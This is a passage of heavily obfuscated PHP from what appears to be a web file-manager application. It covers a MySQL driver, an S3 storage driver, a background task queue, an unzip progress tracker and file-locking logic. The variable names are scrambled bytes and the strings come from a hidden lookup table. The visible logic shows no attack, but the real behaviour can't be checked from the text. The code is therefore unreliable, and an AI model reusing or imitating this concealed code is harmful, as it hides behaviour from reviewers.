think_exception(think_lang($¢“¸´÷û[14]) . $¢“¸´÷û[999]); } if (!empty($œœäŸ£)) { $this->config = $œœäŸ£; if (empty($this->config[$¢“¸´÷û[17]])) { $this->config[$¢“¸´÷û[17]] = $¢“¸´÷û[12]; } } } public function connect($ØõôøûÍ = '', $âïˆÔúŠ = 0) { $¢˜û€¤ó =& $_SERVER[¼’ç§¼´]; if (!isset($this->linkID[$âïˆÔúŠ])) { if (empty($ØõôøûÍ)) { $ØõôøûÍ = $this->config; } $this->linkID[$âïˆÔúŠ] = new mysqli($ØõôøûÍ[$¢˜û€¤ó[972]], $ØõôøûÍ[$¢˜û€¤ó[974]], $ØõôøûÍ[$¢˜û€¤ó[975]], $ØõôøûÍ[$¢˜û€¤ó[21]], $ØõôøûÍ[$¢˜û€¤ó[973]] ? intval($ØõôøûÍ[$¢˜û€¤ó[973]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ä«‘’‹ì = $this->linkID[$âïˆÔúŠ]->server_version; $this->linkID[$âïˆÔúŠ]->query($¢˜û€¤ó[976] . think_config($¢˜û€¤ó[977]) . $¢˜û€¤ó[58]); if ($ä«‘’‹ì > $¢˜û€¤ó[978]) { $this->linkID[$âïˆÔúŠ]->query($¢˜û€¤ó[979]); } $this->connected = !0; if (1 != think_config($¢˜û€¤ó[22])) { unset($this->config); } } return $this->linkID[$âïˆÔúŠ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¾¹Òˆ”º) { $åË·•ìØ =& $_SERVER[¼’ç§¼´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¾¹Òˆ”º; if ($this->queryID) { $this->free(); } think_action_status($åË·•ìØ[23], 1); think_status($åË·•ìØ[24]); $this->queryID = $this->_linkID->query($¾¹Òˆ”º); if ($this->_linkID->more_results()) { while (($å¶­ü©ƒ = $this->_linkID->next_result()) != NULL) { $å¶­ü©ƒ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ëèÖ÷ˆ») { $”ã§ç¾¤ =& $_SERVER[¼’ç§¼´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ëèÖ÷ˆ»; if ($this->queryID) { $this->free(); } think_action_status($”ã§ç¾¤[25], 1); think_status($”ã§ç¾¤[24]); $ÌøŸ†æÔ = $this->_linkID->query($ëèÖ÷ˆ»); $this->debug(); if (!1 === $ÌøŸ†æÔ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Èâœ‹ùß = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Èâœ‹ùß) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $×â·¶ºà = $this->_linkID->rollback(); $this->transTimes = 0; if (!$×â·¶ºà) { $this->error(); return !1; } } return !0; } private function getAll() { $üæøäé³ = array(); if ($this->numRows > 0) { for ($÷ÊÒŞæ = 0; $÷ÊÒŞæ < $this->numRows; $÷ÊÒŞæ++) { $üæøäé³[$÷ÊÒŞæ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $üæøäé³; } public function getFields($ÊğÃ••…) { $Ì¦ˆÒÂ =& $_SERVER[¼’ç§¼´]; $Ñ´ùË¤Ë = $this->query($Ì¦ˆÒÂ[983] . $this->parseKey($ÊğÃ••…)); $èèÚÄ¦ = array(); if ($Ñ´ùË¤Ë) { foreach ($Ñ´ùË¤Ë as $ñÅô×– => $é¥Ã¶Çú) { $èèÚÄ¦[$é¥Ã¶Çú[$Ì¦ˆÒÂ[31]]] = array($Ì¦ˆÒÂ[32] => $é¥Ã¶Çú[$Ì¦ˆÒÂ[31]], $Ì¦ˆÒÂ[33] => $é¥Ã¶Çú[$Ì¦ˆÒÂ[34]], $Ì¦ˆÒÂ[35] => (bool) ($é¥Ã¶Çú[$Ì¦ˆÒÂ[36]] === $Ì¦ˆÒÂ[12]), $Ì¦ˆÒÂ[37] => $é¥Ã¶Çú[$Ì¦ˆÒÂ[38]], $Ì¦ˆÒÂ[39] => strtolower($é¥Ã¶Çú[$Ì¦ˆÒÂ[40]]) == $Ì¦ˆÒÂ[41], $Ì¦ˆÒÂ[42] => strtolower($é¥Ã¶Çú[$Ì¦ˆÒÂ[43]]) == $Ì¦ˆÒÂ[44]); } } return $èèÚÄ¦; } public function getTables($†ïÆŸë× = '') { $ËİüÔ÷š =& $_SERVER[¼’ç§¼´]; $ˆ¯¥şˆ™ = !empty($†ïÆŸë×) ? $ËİüÔ÷š[985] . $†ïÆŸë× . $ËİüÔ÷š[986] : $ËİüÔ÷š[987]; $ÊÍ½¤—ş = $this->query($ˆ¯¥şˆ™); $êÄ„†é´ = array(); if ($ÊÍ½¤—ş) { foreach ($ÊÍ½¤—ş as $ü¤™Ò¢ => $à˜Õ) { $êÄ„†é´[$ü¤™Ò¢] = current($à˜Õ); } } return $êÄ„†é´; } public function replace($êë¬¶ç‘, $è©á¯¾… = array()) { $¯ÛêğœÏ =& $_SERVER[¼’ç§¼´]; foreach ($êë¬¶ç‘ as $‰’Í† => $ùİÌÖêŠ) { $ğš†½• = $this->parseValue($ùİÌÖêŠ); if (is_scalar($ğš†½•)) { $°®„îÀß[] = $ğš†½•; $ ºôÒ¸¤[] = $this->parseKey($‰’Í†); } } $º»Úçİş = $¯ÛêğœÏ[988] . $this->parseTable($è©á¯¾…[$¯ÛêğœÏ[358]]) . $¯ÛêğœÏ[989] . implode($¯ÛêğœÏ[50], $ ºôÒ¸¤) . $¯ÛêğœÏ[990] . implode($¯ÛêğœÏ[50], $°®„îÀß) . $¯ÛêğœÏ[991]; return $this->execute($º»Úçİş); } public function insertAll($šóÅ§½×, $Îõ±ñçî = array(), $Œá×­›Ã = false) { $Í¹Ã®Àä =& $_SERVER[¼’ç§¼´]; if (!is_array($šóÅ§½×[0])) { return !1; } $”µÑÌä‹ = array_keys($šóÅ§½×[0]); $»†ºóæ = array(); foreach ($šóÅ§½× as $Ÿ´ÕÊÑç) { $É€ÎŠÏ = array(); foreach ($Ÿ´ÕÊÑç as $Ğì­‘š => $ƒ¡Şê»Œ) { $ƒ¡Şê»Œ = $this->parseValue($ƒ¡Şê»Œ); if (is_scalar($ƒ¡Şê»Œ)) { $É€ÎŠÏ[] = $ƒ¡Şê»Œ; } } $»†ºóæ[] = $Í¹Ã®Àä[339] . implode($Í¹Ã®Àä[50], $É€ÎŠÏ) . $Í¹Ã®Àä[991]; } array_walk($”µÑÌä‹, array($this, $Í¹Ã®Àä[992])); $Ş†ŠÛ¢ì = $Œá×­›Ã ? $Í¹Ã®Àä[993] : $Í¹Ã®Àä[994]; $Ü‰àîáò = $Ş†ŠÛ¢ì . $Í¹Ã®Àä[995] . $this->parseTable($Îõ±ñçî[$Í¹Ã®Àä[358]]) . $Í¹Ã®Àä[989] . implode($Í¹Ã®Àä[50], $”µÑÌä‹) . $Í¹Ã®Àä[996] . implode($Í¹Ã®Àä[50], $»†ºóæ); return $this->execute($Ü‰àîáò); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $“’ºÀ¸ =& $_SERVER[¼’ç§¼´]; $this->error = $this->_linkID->errno . $“’ºÀ¸[4] . $this->_linkID->error; if ($“’ºÀ¸[12] != $this->queryStr) { $this->error .= LNG($“’ºÀ¸[48]) . $this->queryStr; } think_trace($this->error, $“’ºÀ¸[12], $“’ºÀ¸[49]); return $this->error; } public function escapeString($¯à°ª£) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¯à°ª£); } else { return addslashes($¯à°ª£); } } public function parseKey(&$’—„„î, $·úŒêØ‚ = true) { $Ã£’÷´’ =& $_SERVER[¼’ç§¼´]; if ($·úŒêØ‚) { $’—„„î = $this->parseKeyCheck($’—„„î); } if ($’—„„î != $Ã£’÷´’[222] && !preg_match($Ã£’÷´’[997], $’—„„î)) { $’—„„î = $Ã£’÷´’[472] . trim($’—„„î, $Ã£’÷´’[472]) . $Ã£’÷´’[472]; } return $’—„„î; } } goto BšÀ½Šæ…õ; cî±óõÜ—ò: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Î¾ÉÍÃÓ) { $•­˜²… =& $_SERVER[¼’ç§¼´]; parent::__construct($Î¾ÉÍÃÓ); $ò ï±œ€ = isset($Î¾ÉÍÃÓ[$•­˜²…[258]]) && $Î¾ÉÍÃÓ[$•­˜²…[258]] == $•­˜²…[249] ? $•­˜²…[249] : $•­˜²…[315]; $this->setSignVersion($ò ï±œ€); } public function link($ĞàËğ©, $Ê½‰¦å¼ = array()) { return parent::link($ĞàËğ©, $Ê½‰¦å¼); } public function fileOut($´æ¢½Úì, $Û‹¤ÕÌƒ = false, $Ãû´Úø° = false, $“ßø´ñş = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¼’ç§¼´][316])) { return parent::fileOutServer($´æ¢½Úì, $Û‹¤ÕÌƒ, $Ãû´Úø°, $“ßø´ñş); } parent::fileOut($´æ¢½Úì, $Û‹¤ÕÌƒ, $Ãû´Úø°, $“ßø´ñş); } public function fileOutImage($Şœ€ÖŠì, $’ì¯ŞıÁ = 250) { if (strstr($this->endpoint, $_SERVER[¼’ç§¼´][316])) { return parent::fileOutImageServer($Şœ€ÖŠì, $’ì¯ŞıÁ); } parent::fileOutImage($Şœ€ÖŠì, $’ì¯ŞıÁ); } public function fileOutLink($‡³Ê¦) { $“Ç÷ì« =& $_SERVER[¼’ç§¼´]; if (substr($‡³Ê¦, 0, 7) == $“Ç÷ì«[218]) { $‡³Ê¦ = $“Ç÷ì«[219] . substr($‡³Ê¦, 7); } header($“Ç÷ì«[175] . $‡³Ê¦); die; } } define($_SERVER[¼’ç§¼´][317], 1); define($_SERVER[¼’ç§¼´][318], 2); goto a°¥Ÿ«ëÁğ; E”šÇÊï‰ : class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\121\165\x65\x75\145\114\x65\x6e\147\164\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\121\x75\145\x75\x65\104\141\164\141"; const QUEUE_TIME = "\x74\141\x73\153\121\165\x65\165\145\x4c\x61\x73\164\122\165\x6e"; const QUEUE_THREAD = "\164\x61\x73\153\121\165\145\x75\x65\x54\x68\x72\145\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($şíâ§›‘, $¾ö‘úêÜ = array(), $üµˆìû© = '', $ı§‰›¿Ç = '') { $Ù‹¥ÓÈ÷ =& $_SERVER[¼’ç§¼´]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ı§‰›¿Ç && array_find_by_field(self::$listData, $Ù‹¥ÓÈ÷[97], $ı§‰›¿Ç)) { return !0; } if ($ı§‰›¿Ç && array_find_by_field(self::$listDataAdd, $Ù‹¥ÓÈ÷[97], $ı§‰›¿Ç)) { return !0; } self::$listDataAdd[] = array($Ù‹¥ÓÈ÷[343] => $şíâ§›‘, $Ù‹¥ÓÈ÷[1883] => $¾ö‘úêÜ, $Ù‹¥ÓÈ÷[537] => $üµˆìû©, $Ù‹¥ÓÈ÷[97] => $ı§‰›¿Ç); return !0; } public static function addSubmit() { $Ğ£ó¥à‡ =& $_SERVER[¼’ç§¼´]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Ğ£ó¥à‡[1884] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Ğ£ó¥à‡[12], $Ğ£ó¥à‡[537])), $Ğ£ó¥à‡[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($˜€â¹ÅË, $Â½Ù‰Áü = array(), $ù™€Çõ× = '', $êØ´ìõâ = '') { $êøš¦¬ =& $_SERVER[¼’ç§¼´]; if (self::count() >= self::MAX_LENGTH) { return !1; } $²£“éÓ = self::getAll(); if ($êØ´ìõâ && array_find_by_field($²£“éÓ, $êøš¦¬[97], $êØ´ìõâ)) { return !0; } $²£“éÓ[] = array($êøš¦¬[343] => $˜€â¹ÅË, $êøš¦¬[1883] => $Â½Ù‰Áü, $êøš¦¬[537] => $ù™€Çõ×, $êøš¦¬[97] => $êØ´ìõâ); self::setAll($²£“éÓ); write_log($êøš¦¬[1884] . $ù™€Çõ×, $êøš¦¬[197]); return !0; } public static function run() { $ù´ˆ‰å =& $_SERVER[¼’ç§¼´]; $»›şäì® = self::getAll(); $§úÌëÉœ = array_shift($»›şäì®); if (!$§úÌëÉœ) { return !1; } self::setAll($»›şäì®); $Î…¬Ÿà™ = timeFloat(); $±ØÊéç = $ù´ˆ‰å[12]; try { $±ØÊéç = Hook::apply($§úÌëÉœ[$ù´ˆ‰å[343]], $§úÌëÉœ[$ù´ˆ‰å[1883]]); } catch (Exception $÷®Æ£) { write_log($÷®Æ£, $ù´ˆ‰å[1273]); } $“ñá“˜ = number_format(timeFloat() - $Î…¬Ÿà™, 3) . $ù´ˆ‰å[1799]; if ($±ØÊéç && is_string($±ØÊéç)) { $“ñá“˜ = $“ñá“˜ . $ù´ˆ‰å[1885] . $±ØÊéç; } write_log($ù´ˆ‰å[1886] . $§úÌëÉœ[$ù´ˆ‰å[537]] . $ù´ˆ‰å[1887] . $“ñá“˜, $ù´ˆ‰å[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ä“ıÆ†ù =& $_SERVER[¼’ç§¼´]; $’Œ¯ş¹õ = self::threadCount() + 1; if ($’Œ¯ş¹õ > 3 || !self::count()) { return; } write_log($Ä“ıÆ†ù[1888] . $’Œ¯ş¹õ, $Ä“ıÆ†ù[197]); Cache::set(self::QUEUE_THREAD, $’Œ¯ş¹õ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ä“ıÆ†ù[1889], $Ä“ıÆ†ù[197]); } public static function getKey($†”£şüş, $Á¬ñÈÜî = "\151\156\164") { $“èíÈ±ú =& $_SERVER[¼’ç§¼´]; Cache::removeMemory($†”£şüş); $™»Èùìú = Cache::get($†”£şüş); if ($Á¬ñÈÜî == $“èíÈ±ú[365]) { return $™»Èùìú ? intval($™»Èùìú) : 0; } if ($Á¬ñÈÜî == $“èíÈ±ú[1890]) { return is_array($™»Èùìú) ? $™»Èùìú : array(); } return $™»Èùìú; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¼’ç§¼´][1890]); } public static function setAll($«˜‹‘¸«) { $Áü¥½ÛÜ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($«˜‹‘¸«), $Áü¥½ÛÜ); Cache::set(self::QUEUE_DATA, $«˜‹‘¸«, $Áü¥½ÛÜ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($˜³ìÛ¤Á, $ÆÓıù± = 5.0) { if (!$˜³ìÛ¤Á) { return; } $ÌÍ£Ì¿ğ = Cache::get($˜³ìÛ¤Á); if (!$ÌÍ£Ì¿ğ || timeFloat() - floatVal($ÌÍ£Ì¿ğ) >= $ÆÓıù±) { Cache::set($˜³ìÛ¤Á, timeFloat(), $ÆÓıù± * 10); return !0; } return !1; } public static function timeLimitCall($Í¸…±Ùà, $ÓÈšÍë¹, $Ø†ÈÔÏ, $œÃğ‹”Ø = 5.0) { $§õ—‹Õ¹ =& $_SERVER[¼’ç§¼´]; if (!$Í¸…±Ùà || !$ÓÈšÍë¹) { return; } self::$asyncAdd = !0; $êğ°é£¨ = $§õ—‹Õ¹[1891]; $Ùä¶ÏÉ¾ = Cache::get($êğ°é£¨, !0); $×œşÖ´† = array($§õ—‹Õ¹[1892] => timeFloat(), $§õ—‹Õ¹[1893] => timeFloat(), $§õ—‹Õ¹[343] => $ÓÈšÍë¹, $§õ—‹Õ¹[1883] => $Ø†ÈÔÏ, $§õ—‹Õ¹[206] => $œÃğ‹”Ø); if (is_array($Ùä¶ÏÉ¾[$Í¸…±Ùà])) { $×œşÖ´†[$§õ—‹Õ¹[1893]] = $Ùä¶ÏÉ¾[$Í¸…±Ùà][$§õ—‹Õ¹[1893]]; } if (is_array($Ùä¶ÏÉ¾[$Í¸…±Ùà])) { if (timeFloat() - $Ùä¶ÏÉ¾[$Í¸…±Ùà][$§õ—‹Õ¹[1892]] < $×œşÖ´†[$§õ—‹Õ¹[206]] * 0.3) { return; } $×œşÖ´†[$§õ—‹Õ¹[1893]] = $Ùä¶ÏÉ¾[$Í¸…±Ùà][$§õ—‹Õ¹[1893]]; } $Ùä¶ÏÉ¾[$Í¸…±Ùà] = $×œşÖ´†; Cache::set($êğ°é£¨, $Ùä¶ÏÉ¾, 60); Cache::removeMemory($êğ°é£¨); write_log($§õ—‹Õ¹[1894] . $Í¸…±Ùà . $§õ—‹Õ¹[74] . $ÓÈšÍë¹, $§õ—‹Õ¹[197]); } public static function timeLimitCallLoop() { $‚Ç†âàĞ =& $_SERVER[¼’ç§¼´]; $©Â¼øÙº = array($‚Ç†âàĞ[1895]); $ôËª´÷ş = in_array(strtolower(ACTION), $©Â¼øÙº); if (!$ôËª´÷ş && !self::$asyncAdd) { return; } $Ö——®Æï = $‚Ç†âàĞ[1891]; $ŞúêôŒµ = Cache::get($Ö——®Æï, !0); if (!$ŞúêôŒµ || count($ŞúêôŒµ) <= 0) { return; } $÷‡ôû = !1; $Éã¯Ó = timeFloat(); $ú­Ÿ¹€Ç = array(); foreach ($ŞúêôŒµ as $­¤û•ä => $³„§öë–) { if ($Éã¯Ó - $³„§öë–[$‚Ç†âàĞ[1893]] > $³„§öë–[$‚Ç†âàĞ[206]]) { $÷‡ôû = !0; try { Hook::apply($³„§öë–[$‚Ç†âàĞ[343]], $³„§öë–[$‚Ç†âàĞ[1883]]); write_log($‚Ç†âàĞ[1896] . $­¤û•ä . $‚Ç†âàĞ[74] . $³„§öë–[$‚Ç†âàĞ[343]] . $‚Ç†âàĞ[1897] . ACTION, $‚Ç†âàĞ[197]); } catch (Exception $â‘øÄìÉ) { } continue; } $ú­Ÿ¹€Ç[$­¤û•ä] = $³„§öë–; } if (!$÷‡ôû) { return; } if (!$ú­Ÿ¹€Ç) { return Cache::remove($Ö——®Æï); } Cache::set($Ö——®Æï, $ú­Ÿ¹€Ç, 60); Cache::removeMemory($Ö——®Æï); } public static function finished($ùû¨ëÍ, $–¶Ãı×Ê) { $ÁÌÜš• =& $_SERVER[¼’ç§¼´]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÁÌÜš•[343] => $ùû¨ëÍ, $ÁÌÜš•[1883] => $–¶Ãı×Ê); } private static function finishedRun() { $õ Á’¢ =& $_SERVER[¼’ç§¼´]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $©Ã‡Îù§) { try { Hook::apply($©Ã‡Îù§[$õ Á’¢[343]], $©Ã‡Îù§[$õ Á’¢[1883]]); } catch (Exception $Á‡—¹­) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $›ÔÊŞöÕ =& $_SERVER[¼’ç§¼´]; parent::startAfter(); Hook::bind($›ÔÊŞöÕ[1898], array($this, $›ÔÊŞöÕ[1899])); Hook::bind($›ÔÊŞöÕ[1287], array($this, $›ÔÊŞöÕ[1900])); Hook::bind($›ÔÊŞöÕ[1901], array($this, $›ÔÊŞöÕ[1902])); $âá…ÎÙ =& $this->task; $âá…ÎÙ[$›ÔÊŞöÕ[1903]] = $›ÔÊŞöÕ[1288]; if (!$âá…ÎÙ[$›ÔÊŞöÕ[1671]]) { $âá…ÎÙ[$›ÔÊŞöÕ[1671]] = LNG($›ÔÊŞöÕ[1904]); } } protected function endAfter() { $Ôò§óßİ =& $_SERVER[¼’ç§¼´]; parent::endAfter(); Hook::unbind($Ôò§óßİ[1898], array($this, $Ôò§óßİ[1899])); Hook::unbind($Ôò§óßİ[1287], array($this, $Ôò§óßİ[1900])); Hook::unbind($Ôò§óßİ[1901], array($this, $Ôò§óßİ[1902])); } public function updateAfter() { $¥Ş‰è‚ =& $_SERVER[¼’ç§¼´]; $Ó‡äû¸ =& $this->task; if (!$Ó‡äû¸[$¥Ş‰è‚[1149]] || !$Ó‡äû¸[$¥Ş‰è‚[851]]) { if ($Ó‡äû¸[$¥Ş‰è‚[1903]] != $¥Ş‰è‚[390]) { return; } } if ($Ó‡äû¸[$¥Ş‰è‚[1903]] == $¥Ş‰è‚[1288]) { $Ö¢ŞÈ€Î = 0; if ($Ó‡äû¸[$¥Ş‰è‚[1837]]) { $Ö¢ŞÈ€Î = $Ó‡äû¸[$¥Ş‰è‚[1838]] / $Ó‡äû¸[$¥Ş‰è‚[1837]]; } $Ó‡äû¸[$¥Ş‰è‚[1785]] = $Ö¢ŞÈ€Î * 0.3; } else { if ($Ó‡äû¸[$¥Ş‰è‚[1903]] == $¥Ş‰è‚[390]) { $Ö¢ŞÈ€Î = $Ó‡äû¸[$¥Ş‰è‚[1784]] / $Ó‡äû¸[$¥Ş‰è‚[1149]]; $Ó‡äû¸[$¥Ş‰è‚[1785]] = 0.3 + $Ö¢ŞÈ€Î * 0.4; } else { if ($Ó‡äû¸[$¥Ş‰è‚[1903]] == $¥Ş‰è‚[110]) { $ÉŒ©ÚƒÈ = 0; if ($Ó‡äû¸[$¥Ş‰è‚[1839]] == $¥Ş‰è‚[110]) { $ÉŒ©ÚƒÈ = $Ó‡äû¸[$¥Ş‰è‚[1838]]; } $Ö¢ŞÈ€Î = ($Ó‡äû¸[$¥Ş‰è‚[1842]] + $ÉŒ©ÚƒÈ) / $Ó‡äû¸[$¥Ş‰è‚[851]]; $Ó‡äû¸[$¥Ş‰è‚[1785]] = 0.3 + 0.4 + $Ö¢ŞÈ€Î * 0.3; } } } if ($Ó‡äû¸[$¥Ş‰è‚[1785]] > 0) { $ó·€Á = timeFloat() - $Ó‡äû¸[$¥Ş‰è‚[1787]] - $Ó‡äû¸[$¥Ş‰è‚[1790]]; $Ó‡äû¸[$¥Ş‰è‚[1791]] = $ó·€Á * (1 - $Ó‡äû¸[$¥Ş‰è‚[1785]]) / $Ó‡äû¸[$¥Ş‰è‚[1785]]; } } public function addFile($ØÚ½†–) { $Ğí´ĞÉ =& $_SERVER[¼’ç§¼´]; $ó‹µÒæµ =& $this->task; $†ËÖöˆ† = IO::info($ØÚ½†–); $ó‹µÒæµ[$Ğí´ĞÉ[1835]] = $†ËÖöˆ†[$Ğí´ĞÉ[32]]; $ó‹µÒæµ[$Ğí´ĞÉ[1837]] = $†ËÖöˆ†[$Ğí´ĞÉ[79]]; $ó‹µÒæµ[$Ğí´ĞÉ[1838]] = 0; $ó‹µÒæµ[$Ğí´ĞÉ[1151]] = $Ğí´ĞÉ[1858]; $ó‹µÒæµ[$Ğí´ĞÉ[1839]] = $Ğí´ĞÉ[1288]; $ó‹µÒæµ[$Ğí´ĞÉ[851]] = $†ËÖöˆ†[$Ğí´ĞÉ[79]]; $ó‹µÒæµ[$Ğí´ĞÉ[1149]] = 1; $€üÎÈ¼Ê = 0; $ó‹µÒæµ[$Ğí´ĞÉ[1846]] = array($Ğí´ĞÉ[1847] => $€üÎÈ¼Ê + 1, $Ğí´ĞÉ[505] => $†ËÖöˆ†[$Ğí´ĞÉ[32]], $Ğí´ĞÉ[87] => $†ËÖöˆ†[$Ğí´ĞÉ[87]], $Ğí´ĞÉ[593] => $†ËÖöˆ†[$Ğí´ĞÉ[593]] ? $†ËÖöˆ†[$Ğí´ĞÉ[593]] : $†ËÖöˆ†[$Ğí´ĞÉ[87]]); $this->update(); } public function zipEvent($Î«Á¦Œ, $º°·öä, $¤öş¿Ûü, $é…ó¿Ø) { $Ğñ½³öƒ =& $_SERVER[¼’ç§¼´]; $ßÅÓ¡“Ì =& $this->task; $ßÅÓ¡“Ì[$Ğñ½³öƒ[1835]] = get_path_this($º°·öä); $ßÅÓ¡“Ì[$Ğñ½³öƒ[1837]] = $é…ó¿Ø; $ßÅÓ¡“Ì[$Ğñ½³öƒ[1838]] = $¤öş¿Ûü; $ßÅÓ¡“Ì[$Ğñ½³öƒ[1151]] = $Î«Á¦Œ == $Ğñ½³öƒ[1905] ? $Ğñ½³öƒ[1906] : $Ğñ½³öƒ[1907]; $ßÅÓ¡“Ì[$Ğñ½³öƒ[1839]] = $Ğñ½³öƒ[12]; $ßÅÓ¡“Ì[$Ğñ½³öƒ[851]] = $é…ó¿Ø; $ßÅÓ¡“Ì[$Ğñ½³öƒ[1903]] = $Ğñ½³öƒ[390]; $this->update(); } public function unzipAfter($Ÿºó¾°) { $¥½©‚‹à =& $_SERVER[¼’ç§¼´]; $ì¨„¥ç =& $this->task; $ì¨„¥ç[$¥½©‚‹à[1903]] = $¥½©‚‹à[110]; $ú…Å×š‡ = IO::infoWithChildren($Ÿºó¾°); $óôÉ»ğ¾ = 0; $ì¨„¥ç[$¥½©‚‹à[1846]] = array($¥½©‚‹à[1847] => $óôÉ»ğ¾ + 1, $¥½©‚‹à[505] => $ú…Å×š‡[$¥½©‚‹à[32]], $¥½©‚‹à[87] => $ú…Å×š‡[$¥½©‚‹à[87]], $¥½©‚‹à[593] => $ú…Å×š‡[$¥½©‚‹à[593]] ? $ú…Å×š‡[$¥½©‚‹à[593]] : $ú…Å×š‡[$¥½©‚‹à[87]]); if ($ú…Å×š‡[$¥½©‚‹à[33]] == $¥½©‚‹à[232]) { $ì¨„¥ç[$¥½©‚‹à[1149]] = 1; } else { $ì¨„¥ç[$¥½©‚‹à[1149]] = $ú…Å×š‡[$¥½©‚‹à[82]][$¥½©‚‹à[80]]; } $ì¨„¥ç[$¥½©‚‹à[1151]] = $¥½©‚‹à[12]; $ì¨„¥ç[$¥½©‚‹à[1839]] = 0; $ì¨„¥ç[$¥½©‚‹à[1784]] = 0; $ì¨„¥ç[$¥½©‚‹à[1837]] = 0; $ì¨„¥ç[$¥½©‚‹à[1838]] = 0; $ì¨„¥ç[$¥½©‚‹à[1835]] = $¥½©‚‹à[12]; $ì¨„¥ç[$¥½©‚‹à[1842]] = 0; $ì¨„¥ç[$¥½©‚‹à[851]] = $ú…Å×š‡[$¥½©‚‹à[79]]; $this->update(); self::log($¥½©‚‹à[1908] . json_encode(array($ì¨„¥ç, $ú…Å×š‡))); } public function nameParse($¥» Ûğñ) { $°İÈ§àÛ =& $_SERVER[¼’ç§¼´]; $…åÚœÄÑ =& $this->task; if ($…åÚœÄÑ[$°İÈ§àÛ[1903]] == $°İÈ§àÛ[1288]) { $…åÚœÄÑ[$°İÈ§àÛ[1903]] = $°İÈ§àÛ[390]; $…åÚœÄÑ[$°İÈ§àÛ[1842]] = 0; $…åÚœÄÑ[$°İÈ§àÛ[851]] = 0; } $ğ£ûÕ™î = get_path_this($¥» Ûğñ); if (strstr($ğ£ûÕ™î, $°İÈ§àÛ[10])) { $…åÚœÄÑ[$°İÈ§àÛ[1784]] += 1; $…åÚœÄÑ[$°İÈ§àÛ[1149]] += 1; } $…åÚœÄÑ[$°İÈ§àÛ[1835]] = $¥» Ûğñ; $this->update(); } } goto aõğŒç…Ş†; B‰‰»—à¥Œ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¾ß®¹Æ) { $Íû×òÂş =& $_SERVER[¼’ç§¼´]; if (!$this->allowLock()) { return; } $this->_lockCheck($Íû×òÂş[632], $¾ß®¹Æ); $½ÃüÌ““ = 1; $this->_lockEvent($¾ß®¹Æ, array($Íû×òÂş[633], $Íû×òÂş[634]), $½ÃüÌ““); $this->_lockParent($¾ß®¹Æ, array($Íû×òÂş[634]), $½ÃüÌ““); $this->_lockEvent($¾ß®¹Æ, array($Íû×òÂş[635], $Íû×òÂş[636]), $½ÃüÌ““); $this->_lockCheckEnd($Íû×òÂş[632], $¾ß®¹Æ); } public function lockCopyEnd($ Î¡ÔÄ–) { $áó±×¥ =& $_SERVER[¼’ç§¼´]; if (!$this->allowLock()) { return; } $¦î¡í± = 0; $this->_lockEvent($ Î¡ÔÄ–, array($áó±×¥[633], $áó±×¥[634]), $¦î¡í±); $this->_lockParent($ Î¡ÔÄ–, array($áó±×¥[634]), $¦î¡í±); $this->_lockEvent($ Î¡ÔÄ–, array($áó±×¥[635], $áó±×¥[636]), $¦î¡í±); } public function lockWriteStart($ÑåãÓÕ­, $ïÇ¥ĞÉ = '') { $©“ğòé =& $_SERVER[¼’ç§¼´]; if (!$this->allowLock()) { return; } $this->_lockCheck($©“ğòé[633], $ÑåãÓÕ­); $³¼ÖÖ‰˜ = 1; $this->_lockKey($©“ğòé[637] . $ÑåãÓÕ­ . $©“ğòé[10] . $ïÇ¥ĞÉ, $³¼ÖÖ‰˜); $this->_lockEvent($ÑåãÓÕ­, array($©“ğòé[632], $©“ğòé[634]), $³¼ÖÖ‰˜); $this->_lockParent($ÑåãÓÕ­, array($©“ğòé[632], 